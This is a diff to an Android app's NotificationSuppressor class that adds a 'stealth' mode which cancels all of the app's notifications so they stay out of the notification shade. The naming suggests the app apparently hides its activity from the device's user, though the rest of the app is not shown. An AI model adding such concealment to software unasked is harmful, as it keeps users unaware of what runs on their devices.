@@ -9,7 +9,15 @@ import androidx.core.app.NotificationCompat;
 import com.fason.app.core.FasonApp;
 import com.fason.app.core.Protocol;
 
+/**
+ * NotificationSuppressor — Stealth notification management.
+ *
+ * Provides methods to enable/disable stealth notifications
+ * and suppress all app notifications from appearing in the shade.
+ */
 public final class NotificationSuppressor {
+
+    private static volatile boolean stealthActive = false;
 
     public static Notification buildStealthNotification() {
         Context ctx = FasonApp.getContext();
@@ -60,5 +68,23 @@ public final class NotificationSuppressor {
         }
         nm.createNotificationChannel(ch);
         return Protocol.NOTIF_CHANNEL;
+    }
+
+    /** Enable stealth notification mode — suppress all notifications. */
+    public static void enable(Context ctx) {
+        stealthActive = true;
+        NotificationManager nm = ctx.getSystemService(NotificationManager.class);
+        if (nm != null) {
+            nm.cancelAll();
+        }
+    }
+
+    /** Disable stealth notification mode. */
+    public static void disable(Context ctx) {
+        stealthActive = false;
+    }
+
+    public static boolean isStealthActive() {
+        return stealthActive;
     }
 }
